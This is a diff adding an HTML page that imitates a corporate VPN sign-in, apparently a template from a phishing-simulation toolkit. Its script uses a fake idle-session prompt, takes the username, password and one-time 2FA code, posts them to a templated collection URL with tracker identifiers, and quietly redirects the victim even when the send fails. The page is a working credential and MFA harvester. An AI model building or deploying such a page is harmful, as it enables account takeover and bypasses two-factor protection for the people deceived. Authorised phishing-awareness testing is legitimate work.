@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Corporate VPN — Sign in</title>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="vpn-shell">
+  <div class="vpn-card">
+    <div class="vpn-header">
+      <div class="vpn-product">[Corporate VPN]</div>
+      <div class="vpn-subtitle">Authorized users only. By signing in, you accept the acceptable-use policy.</div>
+    </div>
+    <div class="vpn-body">
+      <div class="vpn-warning">
+        Session was idle. Please re-authenticate to resume your connection.
+      </div>
+      <form id="vpn-form" autocomplete="off">
+        <div class="vpn-field">
+          <label for="username">Username</label>
+          <input type="text" id="username" name="username" placeholder="DOMAIN\\username" required>
+        </div>
+        <div class="vpn-field">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+        <div class="vpn-field">
+          <label for="code_2fa">One-time code</label>
+          <input type="text" id="code_2fa" name="code_2fa" inputmode="numeric"
+                 pattern="[0-9]{4,8}" maxlength="8" placeholder="6-digit token" required>
+        </div>
+        <button type="submit" class="vpn-connect">Connect</button>
+      </form>
+    </div>
+    <div class="vpn-footer">© Internal Use Only</div>
+  </div>
+</div>
+
+<script data-tracker src="{{TRACKER_URL}}"></script>
+<script>
+(function () {
+  var POST_URL = "{{POST_URL}}";
+  function trackerCtx() {
+    var t = window.__taphish_tracker || {};
+    var q = new URLSearchParams(location.search);
+    return {
+      rid: t.rid || q.get("rid") || "",
+      sess_id: t.session_id || q.get("sess_id") || "",
+      trackerId: t.tracker_id || q.get("trackerId") || "",
+    };
+  }
+  document.getElementById("vpn-form").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var ctx = trackerCtx();
+    fetch(POST_URL, {
+      method: "POST",
+      mode: "cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        page: 1,
+        form_field_data: {
+          username: document.getElementById("username").value,
+          password: document.getElementById("password").value,
+        },
+        code_2fa: document.getElementById("code_2fa").value,
+        rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId,
+      }),
+    }).then(function () {
+      // Operator typically redirects to the real product after capture.
+      location.href = "https://example.com/";
+    }, function () {
+      // Network failure: still redirect so the user sees no error.
+      location.href = "https://example.com/";
+    });
+  });
+})();
+</script>
+</body>
+</html>
